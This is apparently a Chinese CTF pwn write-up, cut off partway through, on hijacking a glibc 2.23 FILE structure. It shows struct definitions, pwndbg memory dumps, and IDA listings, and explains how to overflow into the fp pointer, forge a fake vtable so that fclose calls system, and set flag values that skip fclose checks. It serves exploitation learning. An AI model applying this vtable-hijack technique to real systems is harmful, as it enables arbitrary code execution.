<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*_IO_FILE结构体*/</span></span><br><span class="line"><span class="comment">/* libio/libio.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span>  //新版本下已经被删除</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><h3 id="回归题目，思路明确，溢出修改fd的plus，调用close时调用system，"><a href="#回归题目，思路明确，溢出修改fd的plus，调用close时调用system，" class="headerlink" title="回归题目，思路明确，溢出修改fd的plus，调用close时调用system，"></a>回归题目，思路明确，溢出修改fd的plus，调用close时调用system，</h3><p>下面时vtable的一些内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>程序运行时的情况</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">28</span> = (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t *)<span class="number">0xf7fb6ac0</span></span><br><span class="line">$<span class="number">27</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0xf7e6d990</span> &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = <span class="number">0xf7e6e3b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = <span class="number">0xf7e6e150</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = <span class="number">0xf7e6f230</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = <span class="number">0xf7e700c0</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = <span class="number">0xf7e6d600</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = <span class="number">0xf7e6d210</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = <span class="number">0xf7e6c4b0</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = <span class="number">0xf7e6f4d0</span> &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = <span class="number">0xf7e6c2f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = <span class="number">0xf7e6c1e0</span> &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = <span class="number">0xf7e618d0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = <span class="number">0xf7e6d5b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = <span class="number">0xf7e6d060</span> &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = <span class="number">0xf7e6cda0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = <span class="number">0xf7e6c2c0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = <span class="number">0xf7e6d040</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = <span class="number">0xf7e70250</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = <span class="number">0xf7e70260</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为当前版本还是2.23，可以直接修改虚表，但是为了方便还是修改修改fd里面的指针，指向一个伪造虚表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280                 public fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>280 _bss            ends</span><br><span class="line">.bss:<span class="number">0804B</span>280</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; ===========================================================================</span><br><span class="line">.prgend:<span class="number">0804B</span>284</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; Segment type: Zero-length</span><br><span class="line">.prgend:<span class="number">0804B</span>284 _prgend         segment byte public <span class="string">&#x27;&#x27; use32</span></span><br><span class="line"><span class="string">.prgend:0804B284 _end            label byte</span></span><br><span class="line"><span class="string">.prgend:0804B284 _prgend         ends</span></span><br><span class="line"><span class="string">.prgend:0804B284</span></span><br><span class="line"><span class="string">extern:0804B288 ; ===========================================================================</span></span><br><span class="line"><span class="string">extern:0804B288</span></span><br><span class="line"><span class="string">extern:0804B288 ; Segment type: Externs</span></span><br><span class="line"><span class="string">extern:0804B288 ; extern</span></span><br><span class="line"><span class="string">extern:0804B288 ; char *strstr(const char *haystack, const char *needle)</span></span><br><span class="line"><span class="string">extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j</span></span><br><span class="line"><span class="string">extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o</span></span><br><span class="line"><span class="string">extern:0804B28C ; int printf(const char *format, ...)</span></span><br><span class="line"><span class="string">extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j</span></span><br><span class="line"><span class="string">extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o</span></span><br><span class="line"><span class="string">extern:0804B290 ; int fclose(FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j</span></span><br><span class="line"><span class="string">extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o</span></span><br><span class="line"><span class="string">extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)</span></span><br><span class="line"><span class="string">extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j</span></span><br><span class="line"><span class="string">extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o</span></span><br><span class="line"><span class="string">extern:0804B298 ; unsigned int alarm(unsigned int seconds)</span></span><br><span class="line"><span class="string">extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j</span></span><br><span class="line"><span class="string">extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o</span></span><br><span class="line"><span class="string">extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j</span></span><br><span class="line"><span class="string">extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o</span></span><br><span class="line"><span class="string">extern:0804B2A0 ; int puts(const char *s)</span></span><br><span class="line"><span class="string">extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j</span></span><br><span class="line"><span class="string">extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o</span></span><br><span class="line"><span class="string">extern:0804B2A4 ; void exit(int status)</span></span><br><span class="line"><span class="string">extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j</span></span><br><span class="line"><span class="string">extern:0804B2A4                                         ; DATA XREF: .got.plt:off_804B028↑o</span></span><br><span class="line"><span class="string">extern:0804B2A8 ; char *strchr(const char *s, int c)</span></span><br><span class="line"><span class="string">extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j</span></span><br><span class="line"><span class="string">extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o</span></span><br><span class="line"><span class="string">extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span></span><br><span class="line"><span class="string">extern:0804B2AC                 extrn __libc_start_main:near</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o</span></span><br><span class="line"><span class="string">extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j</span></span><br><span class="line"><span class="string">extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o</span></span><br><span class="line"><span class="string">extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)</span></span><br><span class="line"><span class="string">extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j</span></span><br><span class="line"><span class="string">extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o</span></span><br><span class="line"><span class="string">extern:0804B2B8 ; void *memset(void *s, int c, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j</span></span><br><span class="line"><span class="string">extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o</span></span><br><span class="line"><span class="string">extern:0804B2BC                 extrn __isoc99_scanf:near</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o</span></span><br><span class="line"><span class="string">extern:0804B2C0 ; int atoi(const char *nptr)</span></span><br><span class="line"><span class="string">extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j</span></span><br><span class="line"><span class="string">extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4                 end _start</span></span><br></pre></td></tr></table></figure>

<p>我们产看内存空间发现，在fp后有足够多的空间来放我们的fake_file（虽然filename也很大，但是文件名只可以读取63字节）.所以我们将file放在此处，同时伪造的时候要注意如何跳过fclose的一些检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。</span></span><br><span class="line"><span class="comment">//此外还有其他的绕过方法</span></span><br><span class="line"><span class="comment">//这里我并不清楚这些绕过都是什么，待后续学习</span></span><br><span class="line"><span class="number">1.</span>((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line"><span class="comment">//或者是</span></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span> </span><br><span class="line">&amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line">flag&amp;<span class="number">8</span> = <span class="number">0</span> and flag &amp;<span class="number">2</span> =<span class="number">0</span> and flag &amp; <span class="number">0x8000</span> != <span class="number">0</span></span><br><span class="line">所以flag的值可以为<span class="number">0xfbad8000</span> 或者<span class="number">0xfbad8080</span></span><br><span class="line">  <span class="comment">//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1</span></span><br></pre></td></tr></table></figure>



<p>在执行fclose时会执行unlink等一些操作，同时会free我们开启的fp堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与topchunk相邻，然年进行free,因为储存数据的堆块与topchunk相连，而且其在file堆块前释放，所以两个都会合并到topchunk.fclose会对file_plus的数据进处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539124</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">-1</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>继续我们上述的绕过检查，我们修改其的相关参数后释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;					<span class="comment">//IO_FILE_plus 堆块</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  bk = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> &#123;</span><br><span class="line">  prev_size = <span class="number">352</span>, </span><br><span class="line">  size = <span class="number">4104</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804d570</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">129681</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-134514768</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt; <span class="string">&quot;p\325\004\b&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = 